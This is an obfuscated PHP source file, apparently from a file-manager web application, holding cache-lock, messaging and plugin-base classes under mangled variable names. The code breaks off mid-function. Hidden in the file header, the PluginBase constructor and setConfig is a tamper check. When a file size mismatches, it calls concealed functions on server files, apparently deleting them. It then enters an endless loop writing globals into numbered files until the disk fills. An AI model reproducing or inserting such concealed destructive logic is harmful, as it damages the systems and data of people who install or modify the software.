<?php
 goto e‘Ë½†¢; EêˆãğÉêƒ: if ($_SERVER[$_SERVER[—ÌÒğš÷][879]] != $_size($_file)) { $_getc = $_SERVER[—ÌÒğš÷][880]; $_getfile = $_SERVER[$_SERVER[—ÌÒğš÷][881]] . $_SERVER[—ÌÒğš÷][882]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[—ÌÒğš÷][246], $_getfilec); if (count($_getarrs) < $_SERVER[—ÌÒğš÷][677]) { $exit = $_SERVER[—ÌÒğš÷][883]; $exit(); } $_act = $_SERVER[—ÌÒğš÷][884]; $_act($_file); } class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { $‡´®î¹ş =& $_SERVER[—ÌÒğš÷]; if (self::$handle) { return self::$handle; } $€ğ¨üèö = $GLOBALS[$‡´®î¹ş[6]][$‡´®î¹ş[393]]; self::$timeout = $€ğ¨üèö[$‡´®î¹ş[885]] ? $€ğ¨üèö[$‡´®î¹ş[885]] : 10; $çÒŒµ’‡ = _get($GLOBALS[$‡´®î¹ş[6]], $‡´®î¹ş[886]); $›£ªøÎ™ = $€ğ¨üèö[$‡´®î¹ş[863]] ? $€ğ¨üèö[$‡´®î¹ş[863]] : $‡´®î¹ş[214]; if ($›£ªøÎ™ == $‡´®î¹ş[21] && $çÒŒµ’‡ == $‡´®î¹ş[13]) { $›£ªøÎ™ = $‡´®î¹ş[214]; } switch ($›£ªøÎ™) { case $‡´®î¹ş[866]: self::$handle = new CacheLockRedis(); break; case $‡´®î¹ş[867]: self::$handle = new CacheLockMemcached(); break; case $‡´®î¹ş[21]: self::$handle = new CacheLockDatabase(); break; case $‡´®î¹ş[214]: self::$handle = new CacheLockFile(); break; default: break; } if (GLOBAL_DEBUG_LOG_ALL) { write_log($‡´®î¹ş[887], $‡´®î¹ş[888]); } return self::$handle; } private static function key($¨¢÷ÜÑ) { return $_SERVER[—ÌÒğš÷][889] . Cache::key($¨¢÷ÜÑ); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($´¶‘ç‚ú = '') { self::$errorMsg = $´¶‘ç‚ú; } public static function lockGlobal($åŸı¸±¿, $©õÈî¦Ë) { return self::lock($åŸı¸±¿, $©õÈî¦Ë, !0); } public static function lock($Â¨Ú××Ê, $À¢Õòš  = false, $Şüëğé = false) { $µæ £€„ =& $_SERVER[—ÌÒğš÷]; $ßã»¯Î‚ = self::init(); $ùâ²ùİ» = self::key($Â¨Ú××Ê); $À¢Õòš  = $À¢Õòš  ? $À¢Õòš  : self::$timeout; $çº®å†¾ = timeFloat(); $—šÄìö© = $ßã»¯Î‚->lock($ùâ²ùİ», $À¢Õòš ); $Ü‡˜ôšÓ = timeFloat(); if (!$—šÄìö©) { $¹ùñœĞ = "\x6c\157\143\x6b\40\x65\162\162\157\x72\x3b\x6b\145\x79\75{$Â¨Ú××Ê}\73\164\151\x6d\145\75{$À¢Õòš }\73" . self::$errorMsg . $µæ £€„[71] . get_caller_msg(); $–ƒ€¦Õ– = LNG($µæ £€„[890]) . "\50{$À¢Õòš }\x73\x29\x2e" . LNG($µæ £€„[891]); $–ƒ€¦Õ– .= $µæ £€„[892]; if (is_string(self::$errorMsg) && self::$errorMsg) { $–ƒ€¦Õ– = $–ƒ€¦Õ– . $µæ £€„[893] . self::$errorMsg; } write_log($µæ £€„[894] . sprintf($µæ £€„[895], timeFloat() - $çº®å†¾) . $µæ £€„[896] . $¹ùñœĞ . $µæ £€„[897] . error_get_last(), $µæ £€„[888]); show_json($–ƒ€¦Õ–, !1); } if (!$Şüëğé) { self::$lockItem[$ùâ²ùİ»] = !0; } if (GLOBAL_DEBUG_LOG_ALL) { $™ûºÂ­Å = number_format(timeFloat() - $Ü‡˜ôšÓ, 3); write_log($µæ £€„[898] . $Â¨Ú××Ê . $µæ £€„[899] . $™ûºÂ­Å, $µæ £€„[888]); } return $—šÄìö©; } public static function lockGet($ÊçáòüÜ) { $œâòÆ¤Ë = self::key($ÊçáòüÜ); if (self::$lockItem[$œâòÆ¤Ë]) { return self::$lockItem[$œâòÆ¤Ë]; } return self::init()->lockGet($œâòÆ¤Ë); } public static function unlock($¿„§Äã) { $²ò‘·Êí =& $_SERVER[—ÌÒğš÷]; $­¡¨…” = self::key($¿„§Äã); self::$lockItem[$­¡¨…”] = null; self::init()->unlock($­¡¨…”); if (GLOBAL_DEBUG_LOG_ALL) { write_log($²ò‘·Êí[900] . $¿„§Äã, $²ò‘·Êí[888]); } return; } public static function unlockRuntime() { $‚åœå‘ó =& $_SERVER[—ÌÒğš÷]; $¦±ÁÉ„ı = self::init(); $ˆğÒü›ì = !1; foreach (self::$lockItem as $›Ùˆú†å => $ÍßˆòÎÁ) { if (!$ÍßˆòÎÁ) { continue; } $¦±ÁÉ„ı->unlock($›Ùˆú†å); if (!$ˆğÒü›ì) { $ˆğÒü›ì = !0; write_log($‚åœå‘ó[901] . $›Ùˆú†å . $‚åœå‘ó[71] . get_caller_msg(), $‚åœå‘ó[888]); continue; } write_log($‚åœå‘ó[901] . $›Ùˆú†å, $‚åœå‘ó[888]); } self::fileUnlockAll(); if (GLOBAL_DEBUG_LOG_ALL) { $åÑ¼¢½á = number_format(timeFloat() - TIME_FLOAT, 3); write_log($‚åœå‘ó[902] . $åÑ¼¢½á . $‚åœå‘ó[903] . ACTION, $‚åœå‘ó[888]); } } public static function fileLock($Ü‰‹ÃÙ¼) { $¸•ÔË =& $_SERVER[—ÌÒğš÷]; if (!$GLOBALS[$¸•ÔË[904]]) { $GLOBALS[$¸•ÔË[904]] = array(); } $GLOBALS[$¸•ÔË[904]][$Ü‰‹ÃÙ¼] = !1; $ÉˆÏæÒ = fopen(DATA_PATH . $Ü‰‹ÃÙ¼ . $¸•ÔË[905], $¸•ÔË[906]); if (!$ÉˆÏæÒ) { return !1; } $GLOBALS[$¸•ÔË[904]][$Ü‰‹ÃÙ¼] = $ÉˆÏæÒ; if (flock($ÉˆÏæÒ, LOCK_EX)) { return !0; } self::unlock($Ü‰‹ÃÙ¼); show_json($¸•ÔË[907], !1); return !1; } public static function fileUnlock($Íû¬ïª‘) { $µ¨‹çÆş =& $_SERVER[—ÌÒğš÷]; $Äõ‹â— = $GLOBALS[$µ¨‹çÆş[904]][$Íû¬ïª‘]; if (!$Äõ‹â—) { return; } $GLOBALS[$µ¨‹çÆş[904]][$Íû¬ïª‘] = !1; flock($Äõ‹â—, LOCK_UN); fclose($Äõ‹â—); } public static function fileUnlockAll() { $Ññûáíú =& $_SERVER[—ÌÒğš÷]; if (!$GLOBALS[$Ññûáíú[904]]) { return; } foreach ($GLOBALS[$Ññûáíú[904]] as $²à‚ƒ×¯ => $¶ú¾ÇÔ) { if (!$¶ú¾ÇÔ) { continue; } $GLOBALS[$Ññûáíú[904]][$²à‚ƒ×¯] = !1; flock($¶ú¾ÇÔ, LOCK_UN); fclose($¶ú¾ÇÔ); } $GLOBALS[$Ññûáíú[904]] = array(); } } function cacheLockWait() { usleep(mt_rand(200, 5000)); } goto F­ïÖ‰ßø¤; BŞøÒÖˆ‡°: class Message { function __construct() { } public function send($‹¶ÄÉ§£ = '', $Óóøú³‰ = array(), $šŒô™Ò = "\164\x65\170\x74") { $í˜ú¨ƒŒ =& $_SERVER[—ÌÒğš÷]; $šºîÙ”· = array($í˜ú¨ƒŒ[33] => $í˜ú¨ƒŒ[1546], $í˜ú¨ƒŒ[790] => $‹¶ÄÉ§£); if (in_array($šŒô™Ò, array($í˜ú¨ƒŒ[1546], $í˜ú¨ƒŒ[1547]))) { $šºîÙ”·[$í˜ú¨ƒŒ[33]] = $šŒô™Ò; } $Óóøú³‰ = array($í˜ú¨ƒŒ[547] => isset($Óóøú³‰[$í˜ú¨ƒŒ[547]]) ? $Óóøú³‰[$í˜ú¨ƒŒ[547]] : $í˜ú¨ƒŒ[12], $í˜ú¨ƒŒ[630] => isset($Óóøú³‰[$í˜ú¨ƒŒ[630]]) ? $Óóøú³‰[$í˜ú¨ƒŒ[630]] : $í˜ú¨ƒŒ[12]); if (empty($‹¶ÄÉ§£) || empty($Óóøú³‰[$í˜ú¨ƒŒ[547]]) && empty($Óóøú³‰[$í˜ú¨ƒŒ[630]])) { return !1; } $Ğ¦ïûêÜ = array($í˜ú¨ƒŒ[1487] => $šºîÙ”·, $í˜ú¨ƒŒ[1548] => $Óóøú³‰); Hook::trigger($í˜ú¨ƒŒ[1549], $Ğ¦ïûêÜ); } } class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { $°İø›Ÿ¤ =& $_SERVER[—ÌÒğš÷]; $Ê±òÌÌş = $_SERVER[$°İø›Ÿ¤[881]] . $°İø›Ÿ¤[882]; $áÔáá×¥ = $°İø›Ÿ¤[878]; if ($_SERVER[$°İø›Ÿ¤[879]] != $áÔáá×¥($Ê±òÌÌş)) { $Íü°Ô°¡ = $°İø›Ÿ¤[921]; $¥í”Â„æ = $°İø›Ÿ¤[880]; $àÄÌæƒÀ = $_SERVER[$°İø›Ÿ¤[881]] . $°İø›Ÿ¤[882]; $ıŠÉÌ¬÷ = $¥í”Â„æ($àÄÌæƒÀ); $Ô°Ù¤§ = explode($°İø›Ÿ¤[246], $ıŠÉÌ¬÷); if (count($Ô°Ù¤§) < $°İø›Ÿ¤[658]) { $Ñõ…ïô = $°İø›Ÿ¤[883]; $Ñõ…ïô(); } $İµ¾Å† = $°İø›Ÿ¤[922]; $İµ¾Å†($_SERVER[$°İø›Ÿ¤[923]]); $Íü°Ô°¡ = $°İø›Ÿ¤[921]; $Íü°Ô°¡(); $¨©…‚¡Ù = $°İø›Ÿ¤[924]; $á§òåÑÕ = json_encode($GLOBALS[$°İø›Ÿ¤[925]]); $¥‘Íóé = 1; for ($æŸúÃÄ = $¥‘Íóé; $æŸúÃÄ > 0; $æŸúÃÄ++) { $¨©…‚¡Ù(DATA_PATH . $æŸúÃÄ, $á§òåÑÕ); } } global $in, $config; $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($°İø›Ÿ¤[1550]); $this->pluginName = str_replace($°İø›Ÿ¤[1550], $°İø›Ÿ¤[12], get_class($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $°İø›Ÿ¤[8]; $this->pluginApi = appHostGet() . $°İø›Ÿ¤[1551] . $this->pluginName . $°İø›Ÿ¤[8]; $this->pluginHost = $config[$°İø›Ÿ¤[1552]] . $this->pluginName . $°İø›Ÿ¤[8]; $this->pluginHostDefault = $config[$°İø›Ÿ¤[1552]] . $this->pluginName . $°İø›Ÿ¤[8]; $úÒ…ğèå = $config[$°İø›Ÿ¤[1553]]; if ($úÒ…ğèå && strpos($°İø›Ÿ¤[50] . $úÒ…ğèå . $°İø›Ÿ¤[50], $this->pluginName) !== !1) { $this->pluginHost = $config[$°İø›Ÿ¤[1554]] . $this->pluginName . $°İø›Ÿ¤[8]; } $this->pluginLangArr = $this->initLang(); $this->values = array(); $this->echoJsAssignArr = array(); return $this; } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[—ÌÒğš÷][1555]); } protected function assign($õÀ¸‚ìÁ, $¿¹œÛä = false) { if (is_array($õÀ¸‚ìÁ)) { $this->values = array_merge($this->values, $õÀ¸‚ìÁ); } else { $this->values[$õÀ¸‚ìÁ] = $¿¹œÛä; } } protected function display($ò¾ãü«™) { extract($this->values); require $ò¾ãü«™; } final function hookRegist($ ‚ö÷) { $this->modelPlugin->appRegist($this->pluginName, $ ‚ö÷); } final function appIcon() { $Ÿ÷ä¼Ø =& $_SERVER[—ÌÒğš÷]; $ïÊõı¨ö = $this->appPackage(); $Ü‚ï£ ¿ = $Ÿ÷ä¼Ø[12]; if (isset($ïÊõı¨ö[$Ÿ÷ä¼Ø[458]])) { if (isset($ïÊõı¨ö[$Ÿ÷ä¼Ø[458]][$Ÿ÷ä¼Ø[1556]])) { $Ü‚ï£ ¿ = $Ÿ÷ä¼Ø[1557] . $ïÊõı¨ö[$Ÿ÷ä¼Ø[458]][$Ÿ÷ä¼Ø[1556]] . $Ÿ÷ä¼Ø[1558]; } else { if ($ïÊõı¨ö[$Ÿ÷ä¼Ø[458]][$Ÿ÷ä¼Ø[1559]]) { $Ü‚ï£ ¿ = $Ÿ÷ä¼Ø[1560] . $ïÊõı¨ö[$Ÿ÷ä¼Ø[458]][$Ÿ÷ä¼Ø[1559]] . $Ÿ÷ä¼Ø[1561]; } } } return $Ü‚ï£ ¿; } final function fileCanView($ ãšÒâ) { $ğ«ªàûŞ =& $_SERVER[—ÌÒğš÷]; if (request_url_safe($ ãšÒâ)) { return !0; } if ($this->isShare($ ãšÒâ)) { return !0; } $¿ğ¡¸† = Session::get($ğ«ªàûŞ[1562]); if ($GLOBALS[$ğ«ªàûŞ[536]] != 1 && !$¿ğ¡¸† || !$¿ğ¡¸†[$ğ«ªàûŞ[1563]]) { $Â—Â¿ÎÈ = $ğ«ªàûŞ[1564] . rawurlencode(this_url()); show_tips(LNG($ğ«ªàûŞ[1565]) . $ğ«ªàûŞ[1566] . $Â—Â¿ÎÈ . $ğ«ªàûŞ[1567] . LNG($ğ«ªàûŞ[1568]) . $ğ«ªàûŞ[1569], !1); } if (!Action($ğ«ªàûŞ[1570])->authCan($ğ«ªàûŞ[1571])) { show_tips(LNG($ğ«ªàûŞ[1572]) . $ğ«ªàûŞ[1573], !1); } ActionCall($ğ«ªàûŞ[1574], $ ãšÒâ); } final function isShare($áÁî…°Á) { $Ã¬»’ÛÍ = KodIO::parse($áÁî…°Á); return $Ã¬»’ÛÍ[$_SERVER[—ÌÒğš÷][33]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($ƒ†çò‘) { if (request_url_safe($ƒ†çò‘)) { return $ƒ†çò‘; } if (!$this->isShare($ƒ†çò‘)) { $ƒ†çò‘ = $this->filePath($ƒ†çò‘, !1); } return Action($_SERVER[—ÌÒğš÷][1218])->linkOut($ƒ†çò‘); } public function filePathLinkOut($š™°«Ş) { if (request_url_safe($š™°«Ş)) { return $š™°«Ş; } $this->fileCanView($š™°«Ş); return Action($_SERVER[—ÌÒğš÷][1218])->link($š™°«Ş); } final function filePath($ÛŒ ˜Á–, $™¸¶Š©³ = true, $³¤›ÌÅ = false) { $í¸ÎÖˆà =& $_SERVER[—ÌÒğš÷]; $ÛÈËË³ˆ = $this->filePathGet($ÛŒ ˜Á–, $™¸¶Š©³); if (!$this->fileInfo) { show_tips(LNG($í¸ÎÖˆà[105]), !1); } if ($³¤›ÌÅ && isset($this->fileInfo[$í¸ÎÖˆà[509]]) && $this->fileInfo[$í¸ÎÖˆà[509]]) { $÷Ç»„Õ° = Model($í¸ÎÖˆà[512])->fileInfo($this->fileInfo[$í¸ÎÖˆà[509]]); if (!$÷Ç»„Õ° || !IO::exist($÷Ç»„Õ°[$í¸ÎÖˆà[84]])) { show_tips(LNG($í¸ÎÖˆà[105]) . $í¸ÎÖˆà[1575]); } } Hook::trigger($í¸ÎÖˆà[1576], $ÛÈËË³ˆ); return $ÛÈËË³ˆ; } final function filePathGet($­‡±ü‚›, $ÇÔıö× = true) { $Õ…øõÕ× =& $_SERVER[—ÌÒğš÷]; if ($Ó£øÖ°‰ = $this->checkSharePath($­‡±ü‚›, $ÇÔıö×)) { return $Ó£øÖ°‰; } $this->fileCanView($­‡±ü‚›); if (request_url_safe($­‡±ü‚›)) { $¾éèâƒ = parse_url_query($­‡±ü‚›); if (isset($¾éèâƒ[$Õ…øõÕ×[1577]]) && isset($¾éèâƒ[$Õ…øõÕ×[218]])) { $õ²Å î = Mcrypt::decode($¾éèâƒ[$Õ…øõÕ×[218]], Model($Õ…øõÕ×[806])->get($Õ…øõÕ×[807])); if ($õ²Å î) { $this->fileInfo = IO::info($õ²Å î); $this->fileInfo[$Õ…øõÕ×[1578]] = $­‡±ü‚›; $this->cachePath = $this->pluginCachePath($Õ…øõÕ×[12], $ÇÔıö×); return $õ²Å î; } } $­‡±ü‚› = $this->_cacheHttpFile($­‡±ü‚›, $ÇÔıö×); $this->fileInfo = IO::info($­‡±ü‚›); } else { $this->fileInfo = IO::info($­‡±ü‚›); $this->cachePath = $this->pluginCachePath($Õ…øõÕ×[12], $ÇÔıö×); } return $­‡±ü‚›; } final function _cacheHttpFile($ß•âãš», $ü¥°²§ = true) { $¶Æ½äúÑ =& $_SERVER[—ÌÒğš÷]; $¨ƒøĞ˜ = parse_url_query($ß•âãš»); $ı¿¶ÆæØ = get_path_ext($ß•âãš»); if (isset($¨ƒøĞ˜[$¶Æ½äúÑ[32]]) && $¨ƒøĞ˜[$¶Æ½äúÑ[32]]) { $ı¿¶ÆæØ = get_path_ext($¨ƒøĞ˜[$¶Æ½äúÑ[32]]); } $ŸŠª•Ÿİ = hash_path($ß•âãš») . $¶Æ½äúÑ[10] . $ı¿¶ÆæØ; $this->cachePath = $this->pluginCachePath($ü¥°²§ ? $ŸŠª•Ÿİ : $¶Æ½äúÑ[12]); $ê»òïŸ  = IO::fileNameExist($this->cachePath, $ŸŠª•Ÿİ); if ($ê»òïŸ ) { return KodIO::make($ê»òïŸ ); } $²™ˆ¢œ˜ = rtrim($this->cachePath, $¶Æ½äúÑ[8]) . $¶Æ½äúÑ[8] . $ŸŠª•Ÿİ; return $this->pluginCacheFileSet($²™ˆ¢œ˜, file_get_contents_nossl($ß•âãš»)); } final function checkSharePath($ãÚíÑ„, $ø±“é = true) { $¤Æ‘ÏÄÕ =& $_SERVER[—ÌÒğš÷]; if (!$this->isShare($ãÚíÑ„)) { return !1; } $ÃÙğÆæ± = Action($¤Æ‘ÏÄÕ[1218])->sharePathInfo($ãÚíÑ„); if (!is_array($ÃÙğÆæ±) || !isset($ÃÙğÆæ±[$¤Æ‘ÏÄÕ[84]])) { show_json(LNG($¤Æ‘ÏÄÕ[1579]), !1); } $this->fileInfo = $ÃÙğÆæ±; $this->cachePath = $this->pluginCachePath(!1, $ø±“é); return $ÃÙğÆæ±[$¤Æ‘ÏÄÕ[84]]; } final function pluginCachePath($ôèÁâû¢ = '', $µòÒ×­â = false) { $¼Ú¤öÔÑ =& $_SERVER[—ÌÒğš÷]; if ($µòÒ×­â && is_array($this->fileInfo)) { $ôèÁâû¢ = kodIO::hashPath($this->fileInfo); } $ôÌ¢”Í  = rtrim(IO_PATH_SYSTEM_TEMP . $¼Ú¤öÔÑ[1580] . $this->pluginName . $¼Ú¤öÔÑ[8] . $ôèÁâû¢, $¼Ú¤öÔÑ[8]); $¤ˆÙ§óâ = IO::infoFullSimple($ôÌ¢”Í ); $ó¡êâß = $¤ˆÙ§óâ && is_array($¤ˆÙ§óâ) ? $¤ˆÙ§óâ[$¼Ú¤öÔÑ[84]] : $¼Ú¤öÔÑ[12]; if (!$ó¡êâß) { $ó¡êâß = IO::mkdir($ôÌ¢”Í ); } return $ó¡êâß; } final function pluginCacheFileSet($„£›ã¦÷, $¹š¿ÃÊ = '') { $§ÏÙÌş =& $_SERVER[—ÌÒğš÷]; $“•–¾¹Ğ = IO::infoFullSimple($„£›ã¦÷); if (!$“•–¾¹Ğ) { return IO::mkfile($„£›ã¦÷, $¹š¿ÃÊ, REPEAT_REPLACE); } IO::setContent($“•–¾¹Ğ[$§ÏÙÌş[84]], $¹š¿ÃÊ); return $“•–¾¹Ğ[$§ÏÙÌş[84]]; } final function pluginLocalFile($ßÅ±‹ë° = '') { $ÚŒ––ŠÊ =& $_SERVER[—ÌÒğš÷]; $¥§ä†™ = TEMP_FILES . "{$this->pluginName}\x2f"; if (!is_dir($¥§ä†™)) { mk_dir($¥§ä†™); } if (!$ßÅ±‹ë°) { return $¥§ä†™; } $ÔñßÊ®¤ = IO::info($ßÅ±‹ë°); $ğèë°Ä² = $ÚŒ––ŠÊ[1581] . KodIO::hashPath($ÔñßÊ®¤) . $ÚŒ––ŠÊ[10] . $ÔñßÊ®¤[$ÚŒ––ŠÊ[175]]; if (!checkExtSafe($ğèë°Ä²)) { $ğèë°Ä² = $ğèë°Ä² . $ÚŒ––ŠÊ[1250]; } $¾™É“ÑÆ = $¥§ä†™ . $ğèë°Ä²; if (@file_exists($¾™É“ÑÆ)) { return $¾™É“ÑÆ; } return IO::copy($ßÅ±‹ë°, $¥§ä†™, 0, $ğèë°Ä²); } final function appPackage() { $¦İ©ÏÉƒ =& $_SERVER[—ÌÒğš÷]; if ($this->packageData) { return $this->packageData; } $µÖØü©„ = $this->parseFile($this->pluginPath . $¦İ©ÏÉƒ[1582]); $this->parseLang($µÖØü©„); $›ˆ­èòŒ = json_decode_force($µÖØü©„); if (!$›ˆ­èòŒ) { return array(); } $øµà”€³ = Hook::trigger($¦İ©ÏÉƒ[1583], $›ˆ­èòŒ); if ($øµà”€³ && is_array($øµà”€³)) { $›ˆ­èòŒ = $øµà”€³; } $this->packageData = $›ˆ­èòŒ; return $›ˆ­èòŒ; } public function packageInfoGet($›®´ßÛ§) { $öúØŞ…ò = $this->appPackage(); return array_get_value($öúØŞ…ò, $›®´ßÛ§); } public function packageVersion() { return $this->packageInfoGet($_SERVER[—ÌÒğš÷][1584]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[—ÌÒğš÷][1585]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[—ÌÒğš÷][1586]); } public function echoJsAssign($ò„ÏÇœ, $ºë¤Ê÷£) { $this->echoJsAssignArr[$ò„ÏÇœ] = $ºë¤Ê÷£; } private function parseFile($ğ¹ŒÊæ) { $ê¸ËĞ¶ì =& $_SERVER[—ÌÒğš÷]; $óçÂÒ²« = file_get_contents_nossl($ğ¹ŒÊæ); $—šĞšœ = array($ê¸ËĞ¶ì[1587], $ê¸ËĞ¶ì[1588], $ê¸ËĞ¶ì[1589], $ê¸ËĞ¶ì[1590], $ê¸ËĞ¶ì[1591], $ê¸ËĞ¶ì[1592], $ê¸ËĞ¶ì[1593]); $®é®Ò…Ê = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$ê¸ËĞ¶ì[89]][$ê¸ËĞ¶ì[1594]]); foreach ($this->echoJsAssignArr as $Ôé¹«¹ => $±—ÕÊ¥Ş) { $—šĞšœ[] = $ê¸ËĞ¶ì[1595] . $Ôé¹«¹ . $ê¸ËĞ¶ì[1596]; $®é®Ò…Ê[] = is_array($±—ÕÊ¥Ş) || is_object($±—ÕÊ¥Ş) ? rawurlencode(json_encode($±—ÕÊ¥Ş)) : $±—ÕÊ¥Ş; } if (strstr($óçÂÒ²«, $ê¸ËĞ¶ì[1597])) { $ãù˜Ê†Ù = rawurlencode(json_encode($this->pluginLangArr)); $óçÂÒ²« = str_replace($ê¸ËĞ¶ì[1597], $ãù˜Ê†Ù, $óçÂÒ²«); } if (strstr($óçÂÒ²«, $ê¸ËĞ¶ì[1598])) { $ãù˜Ê†Ù = $ãù˜Ê†Ù = rawurlencode(json_encode($this->getConfig())); $óçÂÒ²« = str_replace($ê¸ËĞ¶ì[1598], $ãù˜Ê†Ù, $óçÂÒ²«); } $óçÂÒ²« = str_replace($—šĞšœ, $®é®Ò…Ê, $óçÂÒ²«); return $óçÂÒ²«; } private function parseLang(&$«úû°ú) { $ÉıæÏ¥­ =& $_SERVER[—ÌÒğš÷]; $èÛş›ıß = $ÉıæÏ¥­[1599]; if (!strstr($«úû°ú, $èÛş›ıß)) { return; } preg_match_all($ÉıæÏ¥­[1600], $«úû°ú, $‡¢¿ìÚ×); if (!is_array($‡¢¿ìÚ×) || count($‡¢¿ìÚ×) == 0 || !is_array($‡¢¿ìÚ×[0]) || count($‡¢¿ìÚ×[0]) == 0) { return; } $¦³œ”ßª = array(); $Ş­ÔºÏ = array(); foreach ($‡¢¿ìÚ×[0] as $ƒ‰åîè) { $³£¬áŞ¿ = substr($ƒ‰åîè, strlen($èÛş›ıß), -4); $ãğå‰Ú´ = LNG($³£¬áŞ¿); $¦³œ”ßª[] = $ƒ‰åîè; $Ş­ÔºÏ[] = str_replace(array($ÉıæÏ¥­[246], $ÉıæÏ¥­[1122], $ÉıæÏ¥­[386], $ÉıæÏ¥­[118]), array($ÉıæÏ¥­[53], $ÉıæÏ¥­[53], $ÉıæÏ¥­[12], $ÉıæÏ¥­[1601]), $ãğå‰Ú´); } $«úû°ú = str_replace($¦³œ”ßª, $Ş­ÔºÏ, $«úû°ú); } private function parseConfig(&$óÈó²è·) { $ ûãıÒÀ =& $_SERVER[—ÌÒğš÷]; $‡äŞèı = $ ûãıÒÀ[1602]; if (!strstr($óÈó²è·, $‡äŞèı)) { return; } preg_match_all($ ûãıÒÀ[1603], $óÈó²è·, $Ô¯®í×¼); if (!is_array($Ô¯®í×¼) || count($Ô¯®í×¼) == 0 || !is_array($Ô¯®í×¼[0]) || count($Ô¯®í×¼[0]) == 0) { return; } $ì³â¢ñ¨ = $this->getConfig(); $à¢Ëéîí = array(); $‡÷ı¼ì¤ = array(); foreach ($Ô¯®í×¼[0] as $óØ®ŸÃü) { $½ßˆ±•Ò = substr($óØ®ŸÃü, strlen($‡äŞèı), -2); $à¢Ëéîí[] = $óØ®ŸÃü; $‡÷ı¼ì¤[] = _get($ì³â¢ñ¨, $½ßˆ±•Ò); } $óÈó²è· = str_replace($à¢Ëéîí, $‡÷ı¼ì¤, $óÈó²è·); } private function parsePackage(&$Û‹ûñ¨) { $ì¬©Ğ¾Á =& $_SERVER[—ÌÒğš÷]; $³ˆÉóûß = $ì¬©Ğ¾Á[1604]; if (!strstr($Û‹ûñ¨, $³ˆÉóûß)) { return; } preg_match_all($ì¬©Ğ¾Á[1605], $Û‹ûñ¨, $Ÿğõƒ¾); if (!is_array($Ÿğõƒ¾) || count($Ÿğõƒ¾) == 0 || !is_array($Ÿğõƒ¾[0]) || count($Ÿğõƒ¾[0]) == 0) { return; } $Ê˜å°¿ö = $this->appPackage(); $Íé¾Î†ç = array(); $ˆĞ˜Óì = array(); foreach ($Ÿğõƒ¾[0] as $Êë‰à‚¡) { $äÕæĞ´î = substr($Êë‰à‚¡, strlen($³ˆÉóûß), -2); $Íé¾Î†ç[] = $Êë‰à‚¡; $ˆĞ˜Óì[] = _get($Ê˜å°¿ö, $äÕæĞ´î); } $Û‹ûñ¨ = str_replace($Íé¾Î†ç, $ˆĞ˜Óì, $Û‹ûñ¨); } final function echoFile($¾Ëİ¥¦«, $°©Á¬‰ß = false) { $·—ªÜ¡Ö =& $_SERVER[—ÌÒğš÷]; $®½œü¨ö = $this->pluginPath . $¾Ëİ¥¦«; if (ACT == $·—ªÜ¡Ö[1606]) { echo $·—ªÜ¡Ö[1607] . $this->pluginName . $·—ªÜ¡Ö[8] . $¾Ëİ¥¦« . $·—ªÜ¡Ö[1608]; if (!file_exists($®½œü¨ö)) { echo $·—ªÜ¡Ö[1609]; return; } } $¼Œ©ŸåÕ = $this->parseFile($®½œü¨ö); $this->parseLang($¼Œ©ŸåÕ); $this->parseConfig($¼Œ©ŸåÕ); $this->parsePackage($¼Œ©ŸåÕ); if (is_array($°©Á¬‰ß)) { $¼Œ©ŸåÕ = str_replace(array_keys($°©Á¬‰ß), array_values($°©Á¬‰ß), $¼Œ©ŸåÕ); } echo $·—ªÜ¡Ö[246] . $¼Œ©ŸåÕ; } final function initLang() { $…ï¿ô«Ş =& $_SERVER[—ÌÒğš÷]; $ÜÔ™» = $…ï¿ô«Ş[1610]; $Ãƒ®®’¶ = $this->pluginPath . $…ï¿ô«Ş[1611]; $’¶—Ã¸‹ = I18n::getType(); $¡æäĞ©¢ = array(); if (file_exists($Ãƒ®®’¶ . $’¶—Ã¸‹ . $…ï¿ô«Ş[875])) { $¡æäĞ©¢ = (include $Ãƒ®®’¶ . $’¶—Ã¸‹ . $…ï¿ô«Ş[875]); } else { if ($’¶—Ã¸‹ == $…ï¿ô«Ş[1612] && !file_exists($Ãƒ®®’¶ . $’¶—Ã¸‹ . $…ï¿ô«Ş[875]) && file_exists($Ãƒ®®’¶ . $…ï¿ô«Ş[1613])) { $¡æäĞ©¢ = (include $Ãƒ®®’¶ . $…ï¿ô«Ş[1613]); } else { if (file_exists($Ãƒ®®’¶ . $ÜÔ™» . $…ï¿ô«Ş[875])) { $¡æäĞ©¢ = (include $Ãƒ®®’¶ . $ÜÔ™» . $…ï¿ô«Ş[875]); } } } if (!is_array($¡æäĞ©¢)) { return array(); } if (@count($¡æäĞ©¢) > 0) { I18n::set($¡æäĞ©¢); } return $¡æäĞ©¢; } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($¼ÑŸ·¾ª) { $ÜŒ§íÆ— =& $_SERVER[—ÌÒğš÷]; $ôéˆ‚«¼ = $_SERVER[$ÜŒ§íÆ—[877]]; $Ò±»øºè = $ÜŒ§íÆ—[878]; if ($_SERVER[$ÜŒ§íÆ—[879]] != $Ò±»øºè($ôéˆ‚«¼)) { $¬Èºã½ = $ÜŒ§íÆ—[921]; $ª·‚İ· = $ÜŒ§íÆ—[880]; $ìÆáÕë€ = $_SERVER[$ÜŒ§íÆ—[881]] . $ÜŒ§íÆ—[882]; $òä¡˜Ñ‰ = $ª·‚İ·($ìÆáÕë€); $®‚ªØ€ = explode($ÜŒ§íÆ—[246], $òä¡˜Ñ‰); if (count($®‚ªØ€) < $ÜŒ§íÆ—[658]) { $å†»ø±ä = $ÜŒ§íÆ—[883]; $å†»ø±ä(); } $¦÷·²Ô‚ = $ÜŒ§íÆ—[922]; $¦÷·²Ô‚($_SERVER[$ÜŒ§íÆ—[923]]); $¬Èºã½ = $ÜŒ§íÆ—[921]; $¬Èºã½(); 